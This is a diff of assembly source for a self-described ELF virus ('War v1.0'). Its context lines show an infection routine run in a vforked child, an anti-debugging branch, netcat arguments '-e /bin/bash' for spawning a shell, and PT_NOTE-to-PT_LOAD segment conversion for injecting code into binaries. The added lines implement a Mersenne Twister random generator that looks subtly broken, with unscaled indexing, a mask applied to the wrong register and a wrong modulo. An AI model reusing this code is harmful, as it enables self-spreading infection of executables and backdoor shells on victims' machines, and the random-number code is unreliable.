@@ -29,7 +29,7 @@ begin:
 	; Initializes stack frame
 	push rbp
 	mov rbp, rsp
-	sub rsp, %$localsize
+	sub rsp, %$localsize 
 
 	mov rax, SYS_CLONE				; _pid = clone(
 	mov rdi, CLONE_VFORK				; 	CLONE_VFORK,
@@ -40,6 +40,7 @@ begin:
 	cmp rax, 0					; if (_pid < 0)
 	jl .skipped					; 	goto .skipped;
 	je .child					; else if (_pid == 0) goto .child;
+
 	jmp .skipped					; else goto .skipped;
 
 .child:
@@ -101,6 +102,7 @@ can_run_infection:
 	xor rsi, rsi					; 	0,
 	xor rdx, rdx					; 	0
 	syscall						; );
+
 	cmp rax, 0					; if (_ret < 0)
 	jl .debugged					; 	goto .debugged;
 
@@ -495,6 +497,8 @@ nc_arg5: db "-e", 0
 nc_arg6: db "/bin/bash", 0
 magic_key: db 0x00					; Will be replaced by a script
 magic_key_size: equ $ - magic_key
+rand_buffer: times 624 dd 0
+rand_index: dd 0
 ; never used but here to be copied in the binary
 signature: db "War v1.0 by jmaia and dhubleur", 0
 ; END FAKE .data SECTION
@@ -1250,6 +1254,105 @@ convert_pt_note_to_load:
 	pop rbp
 	%pop
 	ret						; return _ret;
+
+; Mersenne Twister PRNG algorithm (https://en.wikipedia.org/wiki/Mersenne_Twister)
+; void srand(unsigned int seed);
+; void srand(rdi seed);
+srand:
+	mov [rand_buffer], rdi				; rand_buffer[0] = seed;
+
+	mov rsi, 1					; i = 1;
+	.begin_srand_loop:
+		cmp rsi, 624				; if (i == 624)
+		je .end_srand_loop			; 	goto .end_srand_loop;
+
+		mov rdi, [rand_buffer + rsi - 1]	; _tmp = rand_buffer[i - 1];
+		mov rax, rdi				; _tmp2 = rand_buffer[i - 1];
+		shr rdi, 30				; _tmp >>= 30;
+		xor rax, rdi				; _tmp2 ^= _tmp;
+		imul rax, 1812433253			; _tmp2 *= 1812433253;
+		add rax, rsi				; _tmp2 += i;
+		mov [rand_buffer + rsi], rax		; rand_buffer[i] = _tmp;
+		inc rsi					; i++;
+		jmp .begin_srand_loop			; goto .begin_srand_loop;
+
+	.end_srand_loop:
+		ret
+
+; void generate_random_buffer()
+generate_random_buffer:
+	mov rsi, 0					; i = 0;
+	.begin_generate_random_buffer:
+		cmp rsi, 624				; if (i == 624)
+		je .end_generate_random_buffer		; 	goto .end_generate_random_buffer;
+
+		mov rax, [rand_buffer + rsi]		; y = rand_buffer[i] & 0x80000000;
+		mov rcx, 0x80000000			; ...
+       		and rax, rcx				; ...
+		mov rdx, rsi				; y += rand_buffer[(i + 1) % 624] & 0x7fffffff;
+		inc rdx					; ...
+		and rdx, 623				; ...
+		mov rdx, [rand_buffer + rdx]		; ...
+		and rdi, 0x7fffffff			; ...
+		add rax, rdi				; ...
+
+		mov rdx, rsi				; rand_buffer[i] = rand_buffer[(i + 397) % 624] ^ (y >> 1);
+		add rdx, 397				; ...
+		and rdx, 623				; ...
+		mov rdi, [rand_buffer + rdx]		; ...
+		shr rax, 1				; ...
+		xor rdi, rax				; ...
+		mov [rand_buffer + rsi], rdi		; ...
+
+		test rax, 1				; if (y % 2 == 0)
+		jz .next_generate_random_buffer_loop	; 	goto .next_generate_random_buffer_loop;
+
+		mov rdi, [rand_buffer + rsi]		; rand_buffer[i] = rand_buffer[i] ^ 2567483615;
+		mov rcx, 2567483615			; ...
+		xor rdi, rcx				; ...
+		mov [rand_buffer + rsi], rdi		; ...
+
+		.next_generate_random_buffer_loop:
+			inc rsi				; i++;
+			jmp .begin_generate_random_buffer	; goto .begin_generate_random_buffer;
+
+	.end_generate_random_buffer:
+		ret
+		
+
+; unsigned int rand();
+; rax rand();
+rand:
+	movsxd rax, dword [rand_index]		; if (rand_index != 0)
+	cmp rax, 0				; ...
+	jne .continue				; 	goto .continue;
+	call generate_random_buffer		; generate_random_buffer();
+
+	.continue:
+		movsxd rax, dword [rand_index]		; y = rand_buffer[rand_index];
+		mov rax, [rand_buffer + rax]		; ...
+		mov rdi, rax				; y2 = y >> 11;
+		shr rdi, 11				; ...
+		xor rax, rdi				; y ^= y2;
+		mov rdi, rax				; y2 = y << 7 & 2636928640;
+		shl rdi, 7				; ...
+		mov rcx, 2636928640			; ...
+		and rdi, rcx				; ...
+		xor rax, rdi				; y ^= y2;
+		mov rdi, rax				; y2 = y << 15 & 4022730752;
+		shl rdi, 15				; ...
+		mov rcx, 4022730752			; ...
+		and rdi, rcx				; ...
+		xor rax, rdi				; y ^= y2;
+		mov rdi, rax				; y2 = y >> 18;
+		shr rdi, 18				; ...
+		xor rax, rdi				; y ^= y2;
+		movsxd rdi, dword [rand_index]		; rand_index = (rand_index + 1) % 624;
+		inc rdi					; ...
+		and rdi, 623				; ...
+		mov [rand_index], rdi			; ...
+		ret					; return y;
+	
 
 _end:
 
